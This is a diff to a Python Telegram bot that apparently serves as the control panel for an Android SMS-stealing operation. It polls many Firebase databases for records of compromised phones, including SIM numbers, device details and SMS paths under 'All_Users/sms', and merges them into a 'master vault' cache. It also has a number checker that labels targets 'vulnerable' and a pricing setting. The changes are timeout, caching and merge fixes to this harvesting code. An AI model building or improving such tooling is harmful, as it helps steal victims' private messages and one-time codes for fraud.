@@ -84,6 +84,12 @@ JOIN_VERIFIED_CACHE: dict[int, float] = {}
 MASTER_DEVICE_DICT: dict[str, 'Device'] = {}
 GLOBAL_DEVICE_CACHE: dict[str, list] = {"ALL": []}
 
+# 🔥 FIXED: SETTINGS VARIABLE ADDED BACK
+SETTINGS = {
+    "base_price": 30,
+    "global_panels": []
+}
+
 API_LOCK = asyncio.Lock()
 CACHE_LOCK = asyncio.Lock()  
 POLL_LOCK = asyncio.Lock()   
@@ -626,7 +632,7 @@ def format_checker_result(service: str, number: str, is_reg: bool, ms: int, is_e
     return f"<b>{'☠️ TARGET VULNERABLE (UNREGISTERED)' if not is_reg else '✅ TARGET SECURE (REGISTERED)'}</b>\n\n{emoji} <b>{srv_name}</b>\n📱 {display_num}\n⚡ Ping: {ms} ms"
 
 # ═══════════════════════════════════════════════════════
-#  FIREBASE DATA FETCHERS  (MASTER VAULT SYSTEM)
+#  FIREBASE DATA FETCHERS 
 # ═══════════════════════════════════════════════════════
 
 def push_to_master_vault(temp_devices):
@@ -699,7 +705,12 @@ async def _update_global_cache():
     for i in range(0, len(items), CHUNK_SIZE):
         chunk = items[i:i + CHUNK_SIZE]
         temp_gathered = []
-        tasks = [fetch_device_data_task(tag, url, temp_gathered) for tag, url in chunk]
+        # Wrapper to handle timeouts safely
+        async def fetch_with_timeout(tag, url):
+            try: await asyncio.wait_for(fetch_device_data_task(tag, url, temp_gathered), timeout=10)
+            except: pass
+            
+        tasks = [fetch_with_timeout(tag, url) for tag, url in chunk]
         await asyncio.gather(*tasks, return_exceptions=True)
         
         push_to_master_vault(temp_gathered)
@@ -1539,20 +1550,12 @@ async def on_message(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
     except: pass
 
 # ═══════════════════════════════════════════════════════
-#  FIREBASE DATA FETCHERS  (MASTER VAULT SYSTEM)
+#  FIREBASE POLL — CHUNK ENGINE
 # ═══════════════════════════════════════════════════════
 
-def push_to_master_vault(temp_devices):
-    for d in temp_devices:
-        if d.numbers:  
-            MASTER_DEVICE_DICT[d.id] = d
-    
-    dev_list = list(MASTER_DEVICE_DICT.values())
-    dev_list.sort(key=lambda x: (0 if x.status == "online" else 1, -x.timestamp))
-    GLOBAL_DEVICE_CACHE["ALL"] = dev_list
-
-async def fetch_device_data_task(tag: str, url: str, temp_list: list):
+async def fetch_device_data_task(tag: str, url: str, results_list: list):
     try:
+        devices_list = []
         added_set = set()
         root_keys, sim_all, device_info_all, user_data_all, clients_all = await asyncio.gather(
             fb_keys("", url), fb_get("All_Users/simDetails", url), fb_get("All_Users/Data/DeviceInfo", url),
@@ -1568,7 +1571,7 @@ async def fetch_device_data_task(tag: str, url: str, temp_list: list):
                 if not nums: continue 
                 added_set.add(dev_id)
                 model = info.get("DeviceModel") or info.get("Brand") or f"Device-{dev_id[:6]}"
-                temp_list.append(Device(id=dev_id, name=model, status=parse_status_str(info.get("Status")), battery=parse_battery(info.get("Battery")), timestamp=int(info.get("currentTimeMillis") or sim.get("timestamp") or 0), numbers=nums, device_info=f"Model: {model}\nBrand: {info.get('Brand','')}\nAndroid: {info.get('AndroidVersion','')}\nDevice ID: {dev_id}", sms_path=f"All_Users/sms/{dev_id}", base_url=url, db_tag=tag, last_sms_ts=0.0))
+                devices_list.append(Device(id=dev_id, name=model, status=parse_status_str(info.get("Status")), battery=parse_battery(info.get("Battery")), timestamp=int(info.get("currentTimeMillis") or sim.get("timestamp") or 0), numbers=nums, device_info=f"Model: {model}\nBrand: {info.get('Brand','')}\nAndroid: {info.get('AndroidVersion','')}\nDevice ID: {dev_id}", sms_path=f"All_Users/sms/{dev_id}", base_url=url, db_tag=tag, last_sms_ts=0.0))
         
         if user_data_all and isinstance(user_data_all, dict):
             for dev_id, data in user_data_all.items():
@@ -1577,7 +1580,7 @@ async def fetch_device_data_task(tag: str, url: str, temp_list: list):
                 nums = extract_all_nums(data)
                 if not nums: continue 
                 added_set.add(dev_id)
-                temp_list.append(Device(id=dev_id, name=data.get("d_name") or f"Device-{dev_id[:6]}", status=parse_status_str(data.get("status")), battery=parse_battery(data.get("battery")), timestamp=int(data.get("timestamp") or 0), numbers=nums, device_info=data.get("Device_info") or f"Device ID: {dev_id}", sms_path=f"user_sms/{dev_id}", base_url=url, db_tag=tag, last_sms_ts=0.0))
+                devices_list.append(Device(id=dev_id, name=data.get("d_name") or f"Device-{dev_id[:6]}", status=parse_status_str(data.get("status")), battery=parse_battery(data.get("battery")), timestamp=int(data.get("timestamp") or 0), numbers=nums, device_info=data.get("Device_info") or f"Device ID: {dev_id}", sms_path=f"user_sms/{dev_id}", base_url=url, db_tag=tag, last_sms_ts=0.0))
         
         if clients_all and isinstance(clients_all, dict):
             for dev_id, client in clients_all.items():
@@ -1590,8 +1593,13 @@ async def fetch_device_data_task(tag: str, url: str, temp_list: list):
                 if not nums and not client.get("modelName"): continue
                 added_set.add(dev_id)
                 model = client.get("modelName") or f"Device-{dev_id[:6]}"
-                temp_list.append(Device(id=dev_id, name=model, status=parse_status_bool(client.get("status")), battery=parse_battery(client.get("battery")), timestamp=0, numbers=nums, device_info=f"Model: {model}\nProvider: {client.get('service_provider','')}\nAndroid: {client.get('androidV','')}\nDevice ID: {dev_id}", sms_path=f"All_Users/sms/{dev_id}", base_url=url, db_tag=tag, last_sms_ts=0.0))
+                devices_list.append(Device(id=dev_id, name=model, status=parse_status_bool(client.get("status")), battery=parse_battery(client.get("battery")), timestamp=0, numbers=nums, device_info=f"Model: {model}\nProvider: {client.get('service_provider','')}\nAndroid: {client.get('androidV','')}\nDevice ID: {dev_id}", sms_path=f"All_Users/sms/{dev_id}", base_url=url, db_tag=tag, last_sms_ts=0.0))
+                
+        if devices_list:
+            results_list.extend(devices_list)
     except: pass
+    finally:
+        scan_progress["scanned"] += 1
 
 async def _update_global_cache():
     global scan_progress
@@ -1612,20 +1620,24 @@ async def _update_global_cache():
     for i in range(0, len(items), CHUNK_SIZE):
         chunk = items[i:i + CHUNK_SIZE]
         temp_gathered = []
-        # Wrapper to handle timeouts safely
-        async def fetch_with_timeout(tag, url):
-            try: await asyncio.wait_for(fetch_device_data_task(tag, url, temp_gathered), timeout=10)
-            except: pass
-            
-        tasks = [fetch_with_timeout(tag, url) for tag, url in chunk]
+        tasks = [fetch_device_data_task(tag, url, temp_gathered) for tag, url in chunk]
         await asyncio.gather(*tasks, return_exceptions=True)
         
-        push_to_master_vault(temp_gathered)
-        scan_progress["scanned"] += len(chunk)
+        # 🔥 MERGE DIRECTLY TO MASTER VAULT: Numbers will never drop!
+        for d in temp_gathered:
+            if d.numbers:
+                MASTER_DEVICE_DICT[d.id] = d
+                
+        # Generate clean list for cache
+        unique_devices = list(MASTER_DEVICE_DICT.values())
+        unique_devices.sort(key=lambda x: (0 if x.status == "online" else 1, -x.timestamp))
+        GLOBAL_DEVICE_CACHE["ALL"] = unique_devices
         
+        scan_progress["scanned"] += len(chunk)
         temp_gathered.clear()
-        await asyncio.sleep(0.1) 
-
+        gc.collect() 
+        await asyncio.sleep(0.5) 
+        
     scan_progress["is_scanning"] = False
 
 async def global_cache_loop():
@@ -1737,6 +1749,7 @@ async def poll_single_db(tag: str, url: str) -> None:
                 await asyncio.sleep(0.1)
     except: pass
 
+POLL_LOCK = asyncio.Lock()
 async def poll_loop(app: Application) -> None:
     global _main_app
     _main_app = app
@@ -1776,7 +1789,8 @@ async def start_web_server():
         site = web.TCPSite(runner, '0.0.0.0', port)
         await site.start()
         print(f"✅ Web server started on port {port} (Railway Alive)")
-    except: pass
+    except Exception as e:
+        pass
 
 # ═══════════════════════════════════════════════════════
 #  MAIN ENTRY POINT
